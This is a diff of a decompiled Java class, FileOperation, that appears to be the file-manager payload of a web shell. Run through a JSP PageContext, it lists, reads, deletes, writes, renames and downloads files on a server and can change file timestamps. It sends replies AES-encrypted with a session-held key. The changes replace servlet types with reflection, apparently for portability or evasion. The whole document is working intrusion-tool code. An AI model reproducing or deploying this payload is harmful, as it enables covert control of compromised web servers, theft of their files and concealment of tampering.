@@ -21,10 +21,6 @@ import java.util.Map;
 import java.util.Set;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class FileOperation {
    public static String mode;
@@ -35,66 +31,126 @@ public class FileOperation {
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
    private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
 
    public boolean equals(Object obj) {
       Object result = new HashMap();
+      boolean var15 = false;
 
-      try {
-         this.fillContext(obj);
-         if (mode.equalsIgnoreCase("list")) {
-            ((Map)result).put("msg", this.list());
-            ((Map)result).put("status", "success");
-         } else if (mode.equalsIgnoreCase("show")) {
-            ((Map)result).put("msg", this.show());
-            ((Map)result).put("status", "success");
-         } else if (mode.equalsIgnoreCase("delete")) {
-            result = this.delete();
-         } else if (mode.equalsIgnoreCase("create")) {
-            ((Map)result).put("msg", this.create());
-            ((Map)result).put("status", "success");
-         } else if (mode.equalsIgnoreCase("append")) {
-            ((Map)result).put("msg", this.append());
-            ((Map)result).put("status", "success");
-         } else {
-            if (mode.equalsIgnoreCase("download")) {
-               this.download();
-               return true;
+      boolean var3;
+      label164: {
+         Method write;
+         Object so;
+         label165: {
+            try {
+               var15 = true;
+               this.fillContext(obj);
+               if (mode.equalsIgnoreCase("list")) {
+                  ((Map)result).put("msg", this.list());
+                  ((Map)result).put("status", "success");
+                  var15 = false;
+               } else if (mode.equalsIgnoreCase("show")) {
+                  ((Map)result).put("msg", this.show());
+                  ((Map)result).put("status", "success");
+                  var15 = false;
+               } else if (mode.equalsIgnoreCase("delete")) {
+                  result = this.delete();
+                  var15 = false;
+               } else if (mode.equalsIgnoreCase("create")) {
+                  ((Map)result).put("msg", this.create());
+                  ((Map)result).put("status", "success");
+                  var15 = false;
+               } else if (mode.equalsIgnoreCase("append")) {
+                  ((Map)result).put("msg", this.append());
+                  ((Map)result).put("status", "success");
+                  var15 = false;
+               } else {
+                  if (mode.equalsIgnoreCase("download")) {
+                     this.download();
+                     var3 = true;
+                     var15 = false;
+                     break label164;
+                  }
+
+                  if (mode.equalsIgnoreCase("rename")) {
+                     result = this.renameFile();
+                     var15 = false;
+                  } else if (mode.equalsIgnoreCase("createFile")) {
+                     ((Map)result).put("msg", this.createFile());
+                     ((Map)result).put("status", "success");
+                     var15 = false;
+                  } else if (mode.equalsIgnoreCase("createDirectory")) {
+                     ((Map)result).put("msg", this.createDirectory());
+                     ((Map)result).put("status", "success");
+                     var15 = false;
+                  } else if (mode.equalsIgnoreCase("getTimeStamp")) {
+                     ((Map)result).put("msg", this.getTimeStamp());
+                     ((Map)result).put("status", "success");
+                     var15 = false;
+                  } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
+                     ((Map)result).put("msg", this.updateTimeStamp());
+                     ((Map)result).put("status", "success");
+                     var15 = false;
+                  } else {
+                     var15 = false;
+                  }
+               }
+               break label165;
+            } catch (Exception var20) {
+               ((Map)result).put("msg", var20.getMessage());
+               ((Map)result).put("status", "fail");
+               var15 = false;
+            } finally {
+               if (var15) {
+                  try {
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
+                  } catch (Exception var16) {
+                  }
+
+               }
             }
 
-            if (mode.equalsIgnoreCase("rename")) {
-               result = this.renameFile();
-            } else if (mode.equalsIgnoreCase("createFile")) {
-               ((Map)result).put("msg", this.createFile());
-               ((Map)result).put("status", "success");
-            } else if (mode.equalsIgnoreCase("createDirectory")) {
-               ((Map)result).put("msg", this.createDirectory());
-               ((Map)result).put("status", "success");
-            } else if (mode.equalsIgnoreCase("getTimeStamp")) {
-               ((Map)result).put("msg", this.getTimeStamp());
-               ((Map)result).put("status", "success");
-            } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
-               ((Map)result).put("msg", this.updateTimeStamp());
-               ((Map)result).put("status", "success");
+            try {
+               so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+               write = so.getClass().getDeclaredMethod("write", byte[].class);
+               write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
+               so.getClass().getDeclaredMethod("flush").invoke(so);
+               so.getClass().getDeclaredMethod("close").invoke(so);
+            } catch (Exception var18) {
             }
+
+            return true;
          }
-      } catch (Exception var5) {
-         ((Map)result).put("msg", var5.getMessage());
-         ((Map)result).put("status", "fail");
+
+         try {
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var19) {
+         }
+
+         return true;
       }
 
       try {
-         ServletOutputStream so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-      } catch (Exception var4) {
+         Object so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var17) {
       }
 
-      return true;
+      return var3;
    }
 
    private Map warpFileObj(File file) {
@@ -229,14 +285,16 @@ public class FileOperation {
    private void download() throws Exception {
       FileInputStream fis = new FileInputStream(path);
       byte[] buffer = new byte[1024000];
-      int length = buffer.length;
-      ServletOutputStream sos = this.Response.getOutputStream();
+      int length = 0;
+      Object so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+      Method write = so.getClass().getDeclaredMethod("write", byte[].class);
+
       while((length = fis.read(buffer)) > 0) {
-         sos.write(Arrays.copyOfRange(buffer, 0, length));
+         write.invoke(so, Arrays.copyOfRange(buffer, 0, length));
       }
 
-      sos.flush();
-      sos.close();
+      so.getClass().getDeclaredMethod("flush").invoke(so);
+      so.getClass().getDeclaredMethod("close").invoke(so);
       fis.close();
    }
 
@@ -387,7 +445,7 @@ public class FileOperation {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -418,16 +476,16 @@ public class FileOperation {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
-         this.Session = (HttpSession)objMap.get("session");
-         this.Response = (ServletResponse)objMap.get("response");
-         this.Request = (ServletRequest)objMap.get("request");
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
       }
 
-      this.Response.setCharacterEncoding("UTF-8");
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 }
